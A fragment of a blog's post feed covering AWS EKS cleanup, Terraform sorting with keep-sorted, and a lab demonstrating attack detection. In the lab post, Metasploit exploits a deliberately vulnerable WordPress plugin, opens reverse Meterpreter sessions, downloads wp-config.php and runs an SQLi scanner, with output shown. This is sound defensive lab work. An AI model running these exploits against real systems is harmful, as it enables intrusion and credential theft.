cluster: show: true cpu: true memory: true showLabel: true label: \"${CLUSTER_NAME}\" nodes: show: true cpu: true memory: true showLabel: true kubernetes: mode: cluster settings: hideVersion: true title: ${CLUSTER_FQDN} favicon: https://raw.githubusercontent.com/homarr-labs/dashboard-icons/38631ad11695467d7a9e432d5fdec7a39a31e75f/svg/kubernetes.svg layout: Apps: icon: mdi-apps Observability: icon: mdi-chart-bell-curve-cumulative Cluster Management: icon: mdi-tools env: LOG_TARGETS: \"stdout\" EOF helm upgrade --install --version \"${HOMEPAGE_HELM_CHART_VERSION}\" --namespace homepage --create-namespace --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-homepage.yml\" homepage jameswynn/homepage Clean-up Disassociate a Route 53 Resolver query log configuration from an Amazon VPC: AWS_VPC_ID=$(aws ec2 describe-vpcs --filters \"Name=tag:alpha.eksctl.io/cluster-name,Values=${CLUSTER_NAME}\" --query 'Vpcs[*].VpcId' --output text) if [[ -n \"${AWS_VPC_ID}\" ]]; then AWS_CLUSTER_ROUTE53_RESOLVER_QUERY_LOG_CONFIG_ASSOCIATIONS_RESOLVER_QUERY_LOG_CONFIG_ID=$(aws route53resolver list-resolver-query-log-config-associations \\ --query \"ResolverQueryLogConfigAssociations[?ResourceId=='${AWS_VPC_ID}'].ResolverQueryLogConfigId\" --output text) if [[ -n \"${AWS_CLUSTER_ROUTE53_RESOLVER_QUERY_LOG_CONFIG_ASSOCIATIONS_RESOLVER_QUERY_LOG_CONFIG_ID}\" ]]; then aws route53resolver disassociate-resolver-query-log-config --resolver-query-log-config-id \"${AWS_CLUSTER_ROUTE53_RESOLVER_QUERY_LOG_CONFIG_ASSOCIATIONS_RESOLVER_QUERY_LOG_CONFIG_ID}\" --resource-id \"${AWS_VPC_ID}\" sleep 5 fi fi Clean up AWS Route 53 Resolver query log configurations: aws route53resolver list-resolver-query-log-configs --query \"ResolverQueryLogConfigs[?Name=='${CLUSTER_NAME}-vpc-dns-logs'].Id\" | jq -r '.[]' | while read -r AWS_CLUSTER_ROUTE53_RESOLVER_QUERY_LOG_CONFIG_ID; do aws route53resolver delete-resolver-query-log-config --resolver-query-log-config-id \"${AWS_CLUSTER_ROUTE53_RESOLVER_QUERY_LOG_CONFIG_ID}\" done Remove the EKS cluster and its created components: if eksctl get cluster --name=\"${CLUSTER_NAME}\"; then eksctl delete cluster --name=\"${CLUSTER_NAME}\" --force fi Remove the Route 53 DNS records from the DNS Zone: CLUSTER_FQDN_ZONE_ID=$(aws route53 list-hosted-zones --query \"HostedZones[?Name==\\`${CLUSTER_FQDN}.\\`].Id\" --output text) if [[ -n \"${CLUSTER_FQDN_ZONE_ID}\" ]]; then aws route53 list-resource-record-sets --hosted-zone-id \"${CLUSTER_FQDN_ZONE_ID}\" | jq -c '.ResourceRecordSets[] | select (.Type != \"SOA\" and .Type != \"NS\")' | while read -r RESOURCERECORDSET; do aws route53 change-resource-record-sets \\ --hosted-zone-id \"${CLUSTER_FQDN_ZONE_ID}\" \\ --change-batch '{\"Changes\":[{\"Action\":\"DELETE\",\"ResourceRecordSet\": '\"${RESOURCERECORDSET}\"' }]}' \\ --output text --query 'ChangeInfo.Id' done fi Remove the CloudFormation stack: aws cloudformation delete-stack --stack-name \"${CLUSTER_NAME}-route53-kms\" aws cloudformation wait stack-delete-complete --stack-name \"${CLUSTER_NAME}-route53-kms\" aws cloudformation wait stack-delete-complete --stack-name \"eksctl-${CLUSTER_NAME}-cluster\" Remove volumes and snapshots related to the cluster (as a precaution): for VOLUME in $(aws ec2 describe-volumes --filter \"Name=tag:KubernetesCluster,Values=${CLUSTER_NAME}\" \"Name=tag:kubernetes.io/cluster/${CLUSTER_NAME},Values=owned\" --query 'Volumes[].VolumeId' --output text); do echo \"*** Removing Volume: ${VOLUME}\" aws ec2 delete-volume --volume-id \"${VOLUME}\" done Remove the CloudWatch log group: if [[ \"$(aws logs describe-log-groups --query \"logGroups[?logGroupName==\\`/aws/eks/${CLUSTER_NAME}/cluster\\`] | [0].logGroupName\" --output text)\" = \"/aws/eks/${CLUSTER_NAME}/cluster\" ]]; then aws logs delete-log-group --log-group-name \"/aws/eks/${CLUSTER_NAME}/cluster\" fi Remove the ${TMP_DIR}/${CLUSTER_FQDN} directory: if [[ -d \"${TMP_DIR}/${CLUSTER_FQDN}\" ]]; then for FILE in \"${TMP_DIR}/${CLUSTER_FQDN}\"/{kubeconfig-${CLUSTER_NAME}.conf,{aws-cf-route53-kms,eksctl-${CLUSTER_NAME},k8s-storage-storageclass,k8s-karpenter-nodepool,k8s-eks-nodeclass,helm_values-{cert-manager,external-dns,homepage,ingress-nginx,kube-prometheus-stack,mailpit,oauth2-proxy},k8s-cert-manager-{certificate,clusterissuer}-staging}.yml}; do if [[ -f \"${FILE}\" ]]; then rm -v \"${FILE}\" else echo \"*** File not found: ${FILE}\" fi done rmdir \"${TMP_DIR}/${CLUSTER_FQDN}\" fi Enjoy ‚Ä¶ üòâ" }, { "title": "Using keep-sorted to organize Terraform objects", "url": "/posts/terraform-keep-sorted/", "categories": "Terraform, OpenTofu, keep-sorted, sort, iac, code", "tags": "Terraform, OpenTofu, keep-sorted, sort, iac, code", "date": "2024-12-12 00:00:00 +0100", "content": "Alphabetically sorting variables, sets, arrays, and other strings has long been considered good practice, not just in Terraform/OpenTofu code. I want to explore how to sort Terraform/OpenTofu resources, outputs, lists, and more using a dedicated tool. I will explain how to use keep-sorted from Google to maintain well-organized and properly sorted Terraform/OpenTofu code. Rather than diving into a lengthy description of keep-sorted‚Äôs features, let‚Äôs explore some examples. Install keep-sorted by following these steps: TMP_DIR=\"${TMP_DIR:-${PWD}}\" mkdir -pv \"${TMP_DIR}\" wget -q \"https://github.com/google/keep-sorted/releases/download/v0.6.1/keep-sorted_$(uname | tr '[:upper:]' '[:lower:]')\" -O \"${TMP_DIR}/keep-sorted\" chmod +x \"${TMP_DIR}/keep-sorted\" Let‚Äôs consider an example data.tf file: tee \"${TMP_DIR}/data.tf\" &lt;&lt; EOF # keep-sorted start block=yes newline_separated=yes # [APIGateway-007] REST API Gateway 7 data \"wiz_cloud_configuration_rules\" \"apigateway-007\" { search = \"APIGateway-007\" } # [APIGateway-001] REST API Gateway 1 data \"wiz_cloud_configuration_rules\" \"apigateway-001\" { search = \"APIGateway-001\" } # [APIGateway-009] REST API Gateway 9 data \"wiz_cloud_configuration_rules\" \"apigateway-009\" { search = \"APIGateway-009\" } # [APIGateway-002] REST API Gateway 2 data \"wiz_cloud_configuration_rules\" \"apigateway-002\" { search = \"APIGateway-002\" } # keep-sorted end EOF Let‚Äôs check the output after applying keep-sorted: \"${TMP_DIR}/keep-sorted\" \"${TMP_DIR}/data.tf\" &amp;&amp; cat \"${TMP_DIR}/data.tf\" # keep-sorted start block=yes newline_separated=yes # [APIGateway-001] REST API Gateway 1 data \"wiz_cloud_configuration_rules\" \"apigateway-001\" { search = \"APIGateway-001\" } # [APIGateway-002] REST API Gateway 2 data \"wiz_cloud_configuration_rules\" \"apigateway-002\" { search = \"APIGateway-002\" } # [APIGateway-007] REST API Gateway 7 data \"wiz_cloud_configuration_rules\" \"apigateway-007\" { search = \"APIGateway-007\" } # [APIGateway-009] REST API Gateway 9 data \"wiz_cloud_configuration_rules\" \"apigateway-009\" { search = \"APIGateway-009\" } # keep-sorted end Diff: keep-sorted data.tf diff As you can see in the output above: The data resources were sorted alphabetically by their names The comments associated with each data source were preserved and moved along with their respective blocks Here‚Äôs one more example, this time with a main.tf file: tee \"${TMP_DIR}/main.tf\" &lt;&lt; EOF locals { # keep-sorted start block=yes numeric=yes wiz_cloud_configuration_rules_20 = [ # keep-sorted start data.wiz_cloud_configuration_rules.apigateway-02.id, data.wiz_cloud_configuration_rules.apigateway-01.id, data.wiz_cloud_configuration_rules.apigateway-09.id, data.wiz_cloud_configuration_rules.apigateway-07.id, # keep-sorted end ] wiz_cloud_configuration_rules_5 = [ # keep-sorted start data.wiz_cloud_configuration_rules.apigateway-10.id, data.wiz_cloud_configuration_rules.apigateway-2.id, data.wiz_cloud_configuration_rules.apigateway-27.id, data.wiz_cloud_configuration_rules.apigateway-1.id, # keep-sorted end ] # keep-sorted end } EOF ‚Ä¶and the resulting output is: \"${TMP_DIR}/keep-sorted\" \"${TMP_DIR}/main.tf\" &amp;&amp; cat \"${TMP_DIR}/main.tf\" locals { # keep-sorted start block=yes numeric=yes wiz_cloud_configuration_rules_5 = [ # keep-sorted start data.wiz_cloud_configuration_rules.apigateway-1.id, data.wiz_cloud_configuration_rules.apigateway-10.id, data.wiz_cloud_configuration_rules.apigateway-2.id, data.wiz_cloud_configuration_rules.apigateway-27.id, # keep-sorted end ] wiz_cloud_configuration_rules_20 = [ # keep-sorted start data.wiz_cloud_configuration_rules.apigateway-01.id, data.wiz_cloud_configuration_rules.apigateway-02.id, data.wiz_cloud_configuration_rules.apigateway-07.id, data.wiz_cloud_configuration_rules.apigateway-09.id, # keep-sorted end ] # keep-sorted end } Diff: keep-sorted main.tf diff keep-sorted has several other features documented in its README.md. As I mentioned before, it‚Äôs not limited to use with only Terraform/OpenTofu. Cleanup Delete all created files using the following command: rm -v \"${TMP_DIR}\"/{data,main}.tf \"${TMP_DIR}/keep-sorted\" Enjoy ‚Ä¶ üòâ" }, { "title": "Detect the hacker attacks on Amazon EKS and EC2 instances", "url": "/posts/detect-a-hacker-attacks-eks-vm/", "categories": "Kubernetes, Amazon EKS, Security, Exploit, Vulnerability, Kali Linux, EC2, Docker", "tags": "Amazon EKS, container, docker, EC2, eksctl, exploit, k8s, Kali Linux, kubernetes, plugin, security, SQLi, vulnerability, WordPress", "date": "2024-07-07 00:00:00 +0200", "content": "In previous posts, 1 and 2, I demonstrated how to exploit a vulnerability in a WordPress plugin running on Amazon EKS, EC2, and EC2 with Docker instances using Kali Linux and Metasploit. In this post, I would like to explore how to detect hacker attacks using the Wiz security tool. I will cover the following steps: Install a vulnerable WordPress application and plugin to Amazon EKS, EC2, and EC2+Docker instances Secure the Amazon EKS and EC2 instances using a security tool Exploit a vulnerability in a WordPress plugin using Kali Linux and Metasploit Summarize the detection results Architecture diagram: Kali Linux attacks WordPress on EKS, VM, and VM with Docker Build the Amazon EKS, EC2 instances with Wordpress Application and Kali Linux This section contains the commands needed to build the Amazon EKS and EC2 instances with the vulnerable WordPress application. I will not cover all the details, as they were already described in previous posts 1 and 2. Requirements: AWS CLI rain eksctl kubectl helm I will cover only the necessary commands here, without detailed descriptions. # export AWS_ACCESS_KEY_ID=\"xxxxxxxxxxxxxxxxxx\" # export AWS_SECRET_ACCESS_KEY=\"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\" export AWS_REGION=\"eu-central-1\" AWS_EC2_KEY_PAIR_NAME=\"wordpress-test\" TMP_DIR=\"${TMP_DIR:-${PWD}}\" WORDPRESS_USERNAME=\"wordpress\" WORDPRESS_PASSWORD=$(openssl rand -base64 12) MARIADB_WORDPRESS_DATABASE=\"wordpress\" MARIADB_WORDPRESS_DATABASE_USER=\"wordpress\" MARIADB_WORDPRESS_DATABASE_PASSWORD=$(openssl rand -base64 12) MARIADB_ROOT_PASSWORD=$(openssl rand -base64 12) ## Download the CloudFormation templates # renovate: currentValue=master wget --continue -q -P \"${TMP_DIR}\" https://raw.githubusercontent.com/aws-samples/aws-codebuild-samples/00284b828a360aa89ac635a44d84c5a748af03d3/ci_tools/vpc_cloudformation_template.yml # renovate: wget --continue -q -P \"${TMP_DIR}\" https://raw.githubusercontent.com/aws-samples/amazon-ec2-nice-dcv-samples/9ae94412ff1b4da8eb947516f84a17b11226d174/cfn/KaliLinux-NICE-DCV.yaml # renovate: wget --continue -q -P \"${TMP_DIR}\" https://raw.githubusercontent.com/aws-samples/ec2-lamp-server/1f3539b5dc2745a974c99a3ed911da00f59534bd/AmazonLinux-2023-LAMP-server.yaml ## Create a new AWS EC2 Key Pair to be used for the EC2 instances aws ec2 create-key-pair --key-name \"${AWS_EC2_KEY_PAIR_NAME}\" --key-type ed25519 --query \"KeyMaterial\" --output text &gt; \"${TMP_DIR}/${AWS_EC2_KEY_PAIR_NAME}.pem\" chmod 600 \"${TMP_DIR}/${AWS_EC2_KEY_PAIR_NAME}.pem\" Amazon EKS with Wordpress Install the Amazon EKS cluster using eksctl, run the vulnerable WordPress application, and connect the cluster to Wiz. export CLUSTER_NAME=\"Amazon-EKS\" export KUBECONFIG=\"${TMP_DIR}/kubeconfig-${CLUSTER_NAME}.conf\" eksctl create cluster \\ --name \"${CLUSTER_NAME}\" --tags \"Owner=${USER},Solution=${CLUSTER_NAME},Cluster=${CLUSTER_NAME}\" \\ --node-type t3a.medium --node-volume-size 20 --node-private-networking \\ --kubeconfig \"${KUBECONFIG}\" ## Install vulnerable Wordpress Application to the Amazon EKS cluster using a Helm chart and modify its default values WORDPRESS_HELM_CHART_VERSION=\"22.1.3\" tee \"${TMP_DIR}/helm_values-wordpress.yml\" &lt;&lt; EOF wordpressUsername: wordpress wordpressPassword: $(openssl rand -base64 12) customPostInitScripts: install_plugins.sh: | wp plugin install backup-backup --version=1.3.7 --activate wp plugin install loginizer --version=1.6.3 --activate persistence: enabled: false mariadb: primary: persistence: enabled: false EOF helm upgrade --install --version \"${WORDPRESS_HELM_CHART_VERSION}\" --namespace wordpress --create-namespace --wait --values \"${TMP_DIR}/helm_values-wordpress.yml\" wordpress oci://registry-1.docker.io/bitnamicharts/wordpress K8S_WORDPRESS_SERVICE=$(kubectl get services --namespace wordpress wordpress --output jsonpath='{.status.loadBalancer.ingress[0].hostname}') ## Install Wiz Kubernetes Integration export WIZ_API_CLIENT_ID=\"xxxx\" export WIZ_API_CLIENT_SECRET=\"xxxx\" export WIZ_SENSOR_CONTAINER_REGISTRY_USERNAME=\"xxxx\" export WIZ_SENSOR_CONTAINER_REGISTRY_PASSWORD=\"xxxx\" helm repo add --force-update wiz-sec https://charts.wiz.io/ helm upgrade --install --namespace wiz --create-namespace --values - wiz-kubernetes-integration wiz-sec/wiz-kubernetes-integration &lt;&lt; EOF global: wizApiToken: clientId: \"${WIZ_API_CLIENT_ID}\" clientToken: \"${WIZ_API_CLIENT_SECRET}\" wiz-kubernetes-connector: enabled: true autoCreateConnector: connectorName: \"${CLUSTER_NAME}\" clusterFlavor: EKS wiz-admission-controller: enabled: true kubernetesAuditLogsWebhook: enabled: true wiz-sensor: enabled: true imagePullSecret: username: \"${WIZ_SENSOR_CONTAINER_REGISTRY_USERNAME}\" password: \"${WIZ_SENSOR_CONTAINER_REGISTRY_PASSWORD}\" sensorClusterName: ${CLUSTER_NAME} EOF Amazon EC2 with Wordpress container Create a new Amazon Linux 2023 EC2 instance, install Docker, and run a WordPress container. export SOLUTION_EC2_CONTAINER=\"Amazon-EC2-Container\" rain deploy --yes \"${TMP_DIR}/vpc_cloudformation_template.yml\" \"${SOLUTION_EC2_CONTAINER}-VPC\" \\ --params \"EnvironmentName=${SOLUTION_EC2_CONTAINER}\" \\ --tags \"Owner=${USER},Environment=dev,Solution=${SOLUTION_EC2_CONTAINER}\" AWS_CLOUDFORMATION_DETAILS=$(aws cloudformation describe-stacks --stack-name \"${SOLUTION_EC2_CONTAINER}-VPC\" --query \"Stacks[0].Outputs[? OutputKey==\\`PublicSubnet1\\` || OutputKey==\\`VPC\\`].{OutputKey:OutputKey,OutputValue:OutputValue}\") AWS_VPC_ID=$(echo \"${AWS_CLOUDFORMATION_DETAILS}\" | jq -r \".[] | select(.OutputKey==\\\"VPC\\\") .OutputValue\") AWS_SUBNET_ID=$(echo \"${AWS_CLOUDFORMATION_DETAILS}\" | jq -r \".[] | select(.OutputKey==\\\"PublicSubnet1\\\") .OutputValue\") rain deploy --node-style original --yes \"${TMP_DIR}/AmazonLinux-2023-LAMP-server.yaml\" \"${SOLUTION_EC2_CONTAINER}\" \\ --params \"instanceType=t4g.medium,ec2Name=${SOLUTION_EC2_CONTAINER},ec2KeyPair=${AWS_EC2_KEY_PAIR_NAME},vpcID=${AWS_VPC_ID},subnetID=${AWS_SUBNET_ID},ec2TerminationProtection=No,webOption=none,databaseOption=none,phpVersion=none\" \\ --tags \"Owner=${USER},Environment=dev,Solution=${SOLUTION_EC2_CONTAINER}\" AWS_EC2_CONTAINER_PUBLIC_IP=$(aws ec2 describe-instances --filters \"Name=tag:Solution,Values=${SOLUTION_EC2_CONTAINER}\" --query \"Reservations[].Instances[].PublicIpAddress\" --output text) ssh -i \"${TMP_DIR}/${AWS_EC2_KEY_PAIR_NAME}.pem\" -o StrictHostKeyChecking=no \"ec2-user@${AWS_EC2_CONTAINER_PUBLIC_IP}\" 'curl -Ls https://github.com/ruzickap.keys &gt;&gt; ~/.ssh/authorized_keys' ## Install Docker and Docker Compose on the instance ssh -i \"${TMP_DIR}/${AWS_EC2_KEY_PAIR_NAME}.pem\" -o StrictHostKeyChecking=no \"ec2-user@${AWS_EC2_CONTAINER_PUBLIC_IP}\" &lt;&lt; \\EOF set -euxo pipefail sudo dnf install -qy docker sudo usermod -aG docker ec2-user sudo systemctl enable --now docker sudo mkdir -p /usr/local/lib/docker/cli-plugins sudo curl -sL https://github.com/docker/compose/releases/latest/download/docker-compose-linux-$(uname -m) -o /usr/local/lib/docker/cli-plugins/docker-compose sudo chown root:root /usr/local/lib/docker/cli-plugins/docker-compose sudo chmod +x /usr/local/lib/docker/cli-plugins/docker-compose EOF ## Install Wordpress in a container with the vulnerable WordPress Backup Migration Plugin and Loginizer plugins # shellcheck disable=SC2087 ssh -i \"${TMP_DIR}/${AWS_EC2_KEY_PAIR_NAME}.pem\" -o StrictHostKeyChecking=no \"ec2-user@${AWS_EC2_CONTAINER_PUBLIC_IP}\" &lt;&lt; EOF2 set -euxo pipefail mkdir -p docker-entrypoint-init.d cat &gt; docker-entrypoint-init.d/wordpress_plugin_install.sh &lt;&lt; EOF wp plugin install backup-backup --version=1.3.7 --activate wp plugin install loginizer --version=1.6.3 --activate EOF chmod a+x docker-entrypoint-init.d/wordpress_plugin_install.sh cat &gt; docker-compose.yml &lt;&lt; EOF services: mariadb: # renovate: datasource=docker depName=bitnami/mariadb image: docker.io/bitnami/mariadb:11.2 volumes: - 'mariadb_data:/bitnami/mariadb' environment: - ALLOW_EMPTY_PASSWORD=no - MARIADB_USER=${MARIADB_WORDPRESS_DATABASE_USER} - MARIADB_DATABASE=${MARIADB_WORDPRESS_DATABASE} - MARIADB_PASSWORD=${MARIADB_WORDPRESS_DATABASE_PASSWORD} - MARIADB_ROOT_PASSWORD=${MARIADB_ROOT_PASSWORD} wordpress: image: docker.io/bitnami/wordpress:6 ports: - '80:8080' - '443:8443' volumes: - 'wordpress_data:/bitnami/wordpress' - '\\${PWD}/docker-entrypoint-init.d:/docker-entrypoint-init.d' depends_on: - mariadb environment: - ALLOW_EMPTY_PASSWORD=no - WORDPRESS_USERNAME=${WORDPRESS_USERNAME} - WORDPRESS_PASSWORD=${WORDPRESS_PASSWORD} - WORDPRESS_DATABASE_HOST=mariadb - WORDPRESS_DATABASE_PORT_NUMBER=3306 - WORDPRESS_DATABASE_USER=${MARIADB_WORDPRESS_DATABASE_USER} - WORDPRESS_DATABASE_PASSWORD=${MARIADB_WORDPRESS_DATABASE_PASSWORD} - WORDPRESS_DATABASE_NAME=${MARIADB_WORDPRESS_DATABASE} volumes: mariadb_data: driver: local wordpress_data: driver: local EOF docker compose up --quiet-pull -d ## Install Wiz Sensor # shellcheck disable=SC2034 export WIZ_API_CLIENT_ID=\"${WIZ_API_CLIENT_ID}\" # shellcheck disable=SC2034 export WIZ_API_CLIENT_SECRET=\"${WIZ_API_CLIENT_SECRET}\" curl -sL https://downloads.wiz.io/sensor/sensor_install.sh | sudo -E bash EOF2 Amazon EC2 with Wordpress Launch a new Amazon Linux 2023 EC2 instance for a standalone WordPress installation. export SOLUTION_EC2=\"Amazon-EC2\" rain deploy --yes \"${TMP_DIR}/vpc_cloudformation_template.yml\" \"${SOLUTION_EC2}-VPC\" \\ --params \"EnvironmentName=${SOLUTION_EC2}\" \\ --tags \"Owner=${USER},Environment=dev,Solution=${SOLUTION_EC2}\" AWS_CLOUDFORMATION_DETAILS=$(aws cloudformation describe-stacks --stack-name \"${SOLUTION_EC2}-VPC\" --query \"Stacks[0].Outputs[? OutputKey==\\`PublicSubnet1\\` || OutputKey==\\`VPC\\`].{OutputKey:OutputKey,OutputValue:OutputValue}\") AWS_VPC_ID=$(echo \"${AWS_CLOUDFORMATION_DETAILS}\" | jq -r \".[] | select(.OutputKey==\\\"VPC\\\") .OutputValue\") AWS_SUBNET_ID=$(echo \"${AWS_CLOUDFORMATION_DETAILS}\" | jq -r \".[] | select(.OutputKey==\\\"PublicSubnet1\\\") .OutputValue\") rain deploy --node-style original --yes \"${TMP_DIR}/AmazonLinux-2023-LAMP-server.yaml\" \"${SOLUTION_EC2}\" \\ --params \"instanceType=t4g.medium,ec2Name=${SOLUTION_EC2},ec2KeyPair=${AWS_EC2_KEY_PAIR_NAME},vpcID=${AWS_VPC_ID},subnetID=${AWS_SUBNET_ID},ec2TerminationProtection=No\" \\ --tags \"Owner=${USER},Environment=dev,Solution=${SOLUTION_EC2}\" AWS_EC2_PUBLIC_IP=$(aws ec2 describe-instances --filters \"Name=tag:Solution,Values=${SOLUTION_EC2}\" --query \"Reservations[].Instances[].PublicIpAddress\" --output text) ssh -i \"${TMP_DIR}/${AWS_EC2_KEY_PAIR_NAME}.pem\" -o StrictHostKeyChecking=no \"ec2-user@${AWS_EC2_PUBLIC_IP}\" 'curl -Ls https://github.com/ruzickap.keys &gt;&gt; ~/.ssh/authorized_keys' ## Configure MariaDB and add a \"wordpress\" user with a password # shellcheck disable=SC2087 ssh -i \"${TMP_DIR}/${AWS_EC2_KEY_PAIR_NAME}.pem\" -o StrictHostKeyChecking=no \"ec2-user@${AWS_EC2_PUBLIC_IP}\" &lt;&lt; EOF2 set -euxo pipefail sudo mysql --user=root &lt;&lt; \\EOF UPDATE mysql.global_priv SET priv=json_set(priv, '$.plugin', 'mysql_native_password', '$.authentication_string', PASSWORD('${MARIADB_ROOT_PASSWORD}')) WHERE User='root'; DELETE FROM mysql.user WHERE User='root' AND Host NOT IN ('localhost', '127.0.0.1', '::1'); DELETE FROM mysql.global_priv WHERE User=''; DROP DATABASE IF EXISTS test; DELETE FROM mysql.db WHERE Db='test' OR Db='test\\\\_%'; CREATE USER '${MARIADB_WORDPRESS_DATABASE_USER}'@'localhost' IDENTIFIED BY '${MARIADB_WORDPRESS_DATABASE_PASSWORD}'; GRANT ALL PRIVILEGES ON ${MARIADB_WORDPRESS_DATABASE}.* TO '${MARIADB_WORDPRESS_DATABASE_USER}'@'localhost'; FLUSH PRIVILEGES; EOF ## Install Wordpress with the vulnerable WordPress Backup Migration Plugin and Loginizer plugins # shellcheck disable=SC2087 wget -q https://raw.githubusercontent.com/wp-cli/builds/gh-pages/phar/wp-cli.phar chmod +x wp-cli.phar sudo mv wp-cli.phar /usr/local/bin/wp cd /var/www/html/ wp core download --version=6.5.3 wp config create --dbname=\"${MARIADB_WORDPRESS_DATABASE}\" --dbuser=\"${MARIADB_WORDPRESS_DATABASE_USER}\" --dbpass=\"${MARIADB_WORDPRESS_DATABASE_PASSWORD}\" wp db create wp core install --url=\"${AWS_EC2_PUBLIC_IP}\" --title=\"My Blog\" --admin_user=\"${WORDPRESS_USERNAME}\" --admin_password=\"${WORDPRESS_PASSWORD}\" --skip-email --admin_email=\"info@example.com\" wp plugin install backup-backup --version=1.3.7 --activate wp plugin install loginizer --version=1.6.3 --activate ## Install Wiz Sensor # shellcheck disable=SC2034 export WIZ_API_CLIENT_ID=\"${WIZ_API_CLIENT_ID}\" # shellcheck disable=SC2034 export WIZ_API_CLIENT_SECRET=\"${WIZ_API_CLIENT_SECRET}\" curl -sL https://downloads.wiz.io/sensor/sensor_install.sh | sudo -E bash EOF2 AWS EC2 instance with Kali Linux Launch an AWS EC2 instance with Kali Linux using a CloudFormation template. export SOLUTION_KALI=\"KaliLinux-NICE-DCV\" rain deploy --yes \"${TMP_DIR}/vpc_cloudformation_template.yml\" \"${SOLUTION_KALI}-VPC\" \\ --params \"EnvironmentName=${SOLUTION_KALI}\" \\ --tags \"Owner=${USER},Environment=dev,Solution=${SOLUTION_KALI}\" AWS_CLOUDFORMATION_DETAILS=$(aws cloudformation describe-stacks --stack-name \"${SOLUTION_KALI}-VPC\" --query \"Stacks[0].Outputs[? OutputKey==\\`PublicSubnet1\\` || OutputKey==\\`VPC\\`].{OutputKey:OutputKey,OutputValue:OutputValue}\") AWS_VPC_ID=$(echo \"${AWS_CLOUDFORMATION_DETAILS}\" | jq -r \".[] | select(.OutputKey==\\\"VPC\\\") .OutputValue\") AWS_SUBNET_ID=$(echo \"${AWS_CLOUDFORMATION_DETAILS}\" | jq -r \".[] | select(.OutputKey==\\\"PublicSubnet1\\\") .OutputValue\") rain deploy --yes --node-style original \"${TMP_DIR}/KaliLinux-NICE-DCV.yaml\" \"${SOLUTION_KALI}\" \\ --params \"ec2KeyPair=${AWS_EC2_KEY_PAIR_NAME},vpcID=${AWS_VPC_ID},subnetID=${AWS_SUBNET_ID},ec2TerminationProtection=No,allowWebServerPorts=HTTP-and-HTTPS\" \\ --tags \"Owner=${USER},Environment=dev,Solution=${SOLUTION_KALI}\" Attack the Wordpress Application from Kali Linux The following section describes using the Metasploit Framework to exploit vulnerabilities in the WordPress Backup Migration Plugin and Loginizer plugins. Allow your user to connect to the Kali Linux instance using SSH and then install Metasploit: AWS_EC2_KALI_LINUX_PUBLIC_IP=$(aws ec2 describe-instances --filters \"Name=tag:Solution,Values=${SOLUTION_KALI}\" --query \"Reservations[].Instances[].PublicIpAddress\" --output text) ssh -i \"${TMP_DIR}/${AWS_EC2_KEY_PAIR_NAME}.pem\" -o StrictHostKeyChecking=no \"kali@${AWS_EC2_KALI_LINUX_PUBLIC_IP}\" 'curl -Ls https://github.com/ruzickap.keys &gt;&gt; ~/.ssh/authorized_keys' scp -i \"${TMP_DIR}/${AWS_EC2_KEY_PAIR_NAME}.pem\" -o StrictHostKeyChecking=no \"${TMP_DIR}/${AWS_EC2_KEY_PAIR_NAME}.pem\" \"kali@${AWS_EC2_KALI_LINUX_PUBLIC_IP}:~\" ssh -i \"${TMP_DIR}/${AWS_EC2_KEY_PAIR_NAME}.pem\" -o StrictHostKeyChecking=no \"kali@${AWS_EC2_KALI_LINUX_PUBLIC_IP}\" &lt;&lt; EOF touch ~/.hushlogin sudo snap install metasploit-framework msfdb init EOF Run the Metasploit Framework and exploit the vulnerability in all three environments (EKS, a standalone EC2 instance, and EC2 with Docker): # shellcheck disable=SC2087 for PUBLIC_IP in ${K8S_WORDPRESS_SERVICE} ${AWS_EC2_PUBLIC_IP} ${AWS_EC2_CONTAINER_PUBLIC_IP}; do echo \"*** ${PUBLIC_IP}\" ssh -i \"${TMP_DIR}/${AWS_EC2_KEY_PAIR_NAME}.pem\" -o StrictHostKeyChecking=no \"kali@${AWS_EC2_KALI_LINUX_PUBLIC_IP}\" &lt;&lt; EOF2 cat &lt;&lt; EOF | msfconsole --quiet --resource - use exploit/multi/http/wp_backup_migration_php_filter set rhost ${PUBLIC_IP} set lhost ${AWS_EC2_KALI_LINUX_PUBLIC_IP} set lport 443 run --no-interact sessions --interact 1 --meterpreter-command ps --meterpreter-command sysinfo \\ --meterpreter-command \"download /bitnami/wordpress/wp-config.php\" use auxiliary/scanner/http/wp_loginizer_log_sqli set rhost ${PUBLIC_IP} set verbose true run exit -y EOF EOF2 done The output below was condensed to display only the attack against WordPress on Amazon EKS: ... resource (stdin)&gt; use exploit/multi/http/wp_backup_migration_php_filter [*] No payload configured, defaulting to php/meterpreter/reverse_tcp resource (stdin)&gt; set rhost a8fe9c409fcee4d7bbcbd9cab63193f8-449369653.eu-central-1.elb.amazonaws.com rhost =&gt; a8fe9c409fcee4d7bbcbd9cab63193f8-449369653.eu-central-1.elb.amazonaws.com resource (stdin)&gt; set lhost 52.57.199.153 lhost =&gt; 52.57.199.153 resource (stdin)&gt; set lport 443 lport =&gt; 443 resource (stdin)&gt; run --no-interact [*] Exploiting target 3.120.120.128 [-] Handler failed to bind to 52.57.199.153:443:- - [*] Started reverse TCP handler on 0.0.0.0:443 [*] Running automatic check (\"set AutoCheck false\" to disable) [*] WordPress Version: 6.5 [+] Detected Backup Migration Plugin version: 1.3.7 [+] The target appears to be vulnerable. [*] Sending the payload, please wait... [*] Sending stage (39927 bytes) to 3.124.173.56 [*] Meterpreter session 1 opened (10.192.10.244:443 -&gt; 3.124.173.56:61739) at 2024-11-23 09:22:05 +0000 [*] Session 1 created in the background. [*] Exploiting target 18.195.11.191 [-] Handler failed to bind to 52.57.199.153:443:- - [*] Started reverse TCP handler on 0.0.0.0:443 [*] Running automatic check (\"set AutoCheck false\" to disable) [*] WordPress Version: 6.5 [+] Detected Backup Migration Plugin version: 1.3.7 [+] The target appears to be vulnerable. [*] Sending the payload, please wait... [*] Sending stage (39927 bytes) to 3.124.173.56 [*] Meterpreter session 2 opened (10.192.10.244:443 -&gt; 3.124.173.56:20234) at 2024-11-23 09:22:26 +0000 [*] Session 2 created in the background. resource (stdin)&gt; sessions --interact 1 --meterpreter-command ps --meterpreter-command sysinfo --meterpreter-command \"download /bitnami/wordpress/wp-config.php\" [*] Running 'ps' on meterpreter session 1 (3.120.120.128) Process List ============ PID Name User Path --- ---- ---- ---- 1 /opt/bitnami/apache/bin/httpd 1001 /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND 309 /opt/bitnami/apache/bin/httpd 1001 /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND 310 /opt/bitnami/apache/bin/httpd 1001 